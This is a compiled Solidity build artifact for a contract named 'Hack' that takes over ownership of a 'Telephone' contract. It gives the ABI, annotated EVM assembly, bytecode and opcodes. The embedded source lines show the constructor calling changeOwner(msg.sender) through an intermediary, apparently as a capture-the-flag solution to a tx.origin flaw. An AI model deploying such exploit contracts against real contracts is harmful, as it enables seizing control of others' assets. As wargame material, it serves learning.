{
	"contracts/Telephone.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_hackAddr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "telephone",
					"outputs": [
						{
							"internalType": "contract Telephone",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Telephone.sol\":57:204  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Telephone.sol\":110:202  constructor(address _hackAddr) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Telephone.sol\":161:170  _hackAddr */\n  dup1\n    /* \"contracts/Telephone.sol\":151:183  Telephone(_hackAddr).changeOwner */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xa6f9dae1\n    /* \"contracts/Telephone.sol\":184:194  msg.sender */\n  caller\n    /* \"contracts/Telephone.sol\":151:195  Telephone(_hackAddr).changeOwner(msg.sender) */\n  mload(0x40)\n  dup3\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  tag_6\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_6:\n  0x00\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup8\n  dup1\n  extcodesize\n  iszero\n  dup1\n  iszero\n  tag_8\n  jumpi\n  revert(0x00, 0x00)\ntag_8:\n  pop\n  gas\n  call\n  iszero\n  dup1\n  iszero\n  tag_10\n  jumpi\n  returndatacopy(0x00, 0x00, returndatasize)\n  revert(0x00, returndatasize)\ntag_10:\n  pop\n  pop\n  pop\n  pop\n    /* \"contracts/Telephone.sol\":110:202  constructor(address _hackAddr) {... */\n  pop\n    /* \"contracts/Telephone.sol\":57:204  contract Hack {... */\n  jump(tag_11)\n    /* \"#utility.yul\":88:205   */\ntag_13:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_15:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_16:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_26\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_15\n  jump\t// in\ntag_26:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_17:\n    /* \"#utility.yul\":641:665   */\n  tag_28\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_16\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_29\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_29:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_18:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_31\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_17\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_33\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_34\n  tag_13\n  jump\t// in\ntag_34:\n    /* \"#utility.yul\":932:1051   */\ntag_33:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_35\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_18\n  jump\t// in\ntag_35:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1202:1320   */\ntag_19:\n    /* \"#utility.yul\":1289:1313   */\n  tag_37\n    /* \"#utility.yul\":1307:1312   */\n  dup2\n    /* \"#utility.yul\":1289:1313   */\n  tag_16\n  jump\t// in\ntag_37:\n    /* \"#utility.yul\":1284:1287   */\n  dup3\n    /* \"#utility.yul\":1277:1314   */\n  mstore\n    /* \"#utility.yul\":1202:1320   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1326:1548   */\ntag_7:\n    /* \"#utility.yul\":1419:1423   */\n  0x00\n    /* \"#utility.yul\":1457:1459   */\n  0x20\n    /* \"#utility.yul\":1446:1455   */\n  dup3\n    /* \"#utility.yul\":1442:1460   */\n  add\n    /* \"#utility.yul\":1434:1460   */\n  swap1\n  pop\n    /* \"#utility.yul\":1470:1541   */\n  tag_39\n    /* \"#utility.yul\":1538:1539   */\n  0x00\n    /* \"#utility.yul\":1527:1536   */\n  dup4\n    /* \"#utility.yul\":1523:1540   */\n  add\n    /* \"#utility.yul\":1514:1520   */\n  dup5\n    /* \"#utility.yul\":1470:1541   */\n  tag_19\n  jump\t// in\ntag_39:\n    /* \"#utility.yul\":1326:1548   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Telephone.sol\":57:204  contract Hack {... */\ntag_11:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Telephone.sol\":57:204  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x93acaa59\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/Telephone.sol\":77:103  Telephone public telephone */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_8:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_9:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_10:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_18\n        /* \"#utility.yul\":306:340   */\n      tag_19\n        /* \"#utility.yul\":315:339   */\n      tag_20\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_8\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":306:340   */\n      tag_9\n      jump\t// in\n    tag_19:\n        /* \"#utility.yul\":288:341   */\n      tag_8\n      jump\t// in\n    tag_18:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_11:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_22\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_10\n      jump\t// in\n    tag_22:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:627   */\n    tag_12:\n        /* \"#utility.yul\":551:560   */\n      0x00\n        /* \"#utility.yul\":584:621   */\n      tag_24\n        /* \"#utility.yul\":615:620   */\n      dup3\n        /* \"#utility.yul\":584:621   */\n      tag_11\n      jump\t// in\n    tag_24:\n        /* \"#utility.yul\":571:621   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:627   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":633:796   */\n    tag_13:\n        /* \"#utility.yul\":736:789   */\n      tag_26\n        /* \"#utility.yul\":783:788   */\n      dup2\n        /* \"#utility.yul\":736:789   */\n      tag_12\n      jump\t// in\n    tag_26:\n        /* \"#utility.yul\":731:734   */\n      dup3\n        /* \"#utility.yul\":724:790   */\n      mstore\n        /* \"#utility.yul\":633:796   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":802:1056   */\n    tag_7:\n        /* \"#utility.yul\":911:915   */\n      0x00\n        /* \"#utility.yul\":949:951   */\n      0x20\n        /* \"#utility.yul\":938:947   */\n      dup3\n        /* \"#utility.yul\":934:952   */\n      add\n        /* \"#utility.yul\":926:952   */\n      swap1\n      pop\n        /* \"#utility.yul\":962:1049   */\n      tag_28\n        /* \"#utility.yul\":1046:1047   */\n      0x00\n        /* \"#utility.yul\":1035:1044   */\n      dup4\n        /* \"#utility.yul\":1031:1048   */\n      add\n        /* \"#utility.yul\":1022:1028   */\n      dup5\n        /* \"#utility.yul\":962:1049   */\n      tag_13\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":802:1056   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a61fd34fad5ca73b600dccd1745c2e9546bbc9dcba1666ad1645f677e643cd1364736f6c634300081b0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b5060405161027e38038061027e833981810160405281019061003191906100fb565b8073ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1336040518263ffffffff1660e01b815260040161006a9190610135565b5f604051808303815f87803b158015610081575f5ffd5b505af1158015610093573d5f5f3e3d5ffd5b505050505061014e565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100ca826100a1565b9050919050565b6100da816100c0565b81146100e4575f5ffd5b50565b5f815190506100f5816100d1565b92915050565b5f602082840312156101105761010f61009d565b5b5f61011d848285016100e7565b91505092915050565b61012f816100c0565b82525050565b5f6020820190506101485f830184610126565b92915050565b6101238061015b5f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c806393acaa5914602a575b5f5ffd5b60306044565b604051603b919060d6565b60405180910390f35b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f60a460a0609c846068565b6087565b6068565b9050919050565b5f60b3826090565b9050919050565b5f60c28260ab565b9050919050565b60d08160ba565b82525050565b5f60208201905060e75f83018460c9565b9291505056fea2646970667358221220a61fd34fad5ca73b600dccd1745c2e9546bbc9dcba1666ad1645f677e643cd1364736f6c634300081b0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x27E CODESIZE SUB DUP1 PUSH2 0x27E DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xFB JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 CALLER PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6A SWAP2 SWAP1 PUSH2 0x135 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x81 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x93 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH2 0x14E JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xCA DUP3 PUSH2 0xA1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xDA DUP2 PUSH2 0xC0 JUMP JUMPDEST DUP2 EQ PUSH2 0xE4 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xF5 DUP2 PUSH2 0xD1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x110 JUMPI PUSH2 0x10F PUSH2 0x9D JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x11D DUP5 DUP3 DUP6 ADD PUSH2 0xE7 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x12F DUP2 PUSH2 0xC0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x148 PUSH0 DUP4 ADD DUP5 PUSH2 0x126 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x123 DUP1 PUSH2 0x15B PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x26 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x93ACAA59 EQ PUSH1 0x2A JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH1 0x30 PUSH1 0x44 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x3B SWAP2 SWAP1 PUSH1 0xD6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0xA4 PUSH1 0xA0 PUSH1 0x9C DUP5 PUSH1 0x68 JUMP JUMPDEST PUSH1 0x87 JUMP JUMPDEST PUSH1 0x68 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0xB3 DUP3 PUSH1 0x90 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0xC2 DUP3 PUSH1 0xAB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0xD0 DUP2 PUSH1 0xBA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH1 0xE7 PUSH0 DUP4 ADD DUP5 PUSH1 0xC9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA6 0x1F 0xD3 0x4F 0xAD TLOAD 0xA7 EXTCODESIZE PUSH1 0xD 0xCC 0xD1 PUSH21 0x5C2E9546BBC9DCBA1666AD1645F677E643CD136473 PUSH16 0x6C634300081B00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "58200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"telephone()": "infinite"
					}
				},
				"methodIdentifiers": {
					"telephone()": "93acaa59"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 4,
						"contract": "contracts/Telephone.sol:Hack",
						"label": "telephone",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Telephone)48"
					}
				],
				"types": {
					"t_contract(Telephone)48": {
						"encoding": "inplace",
						"label": "contract Telephone",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}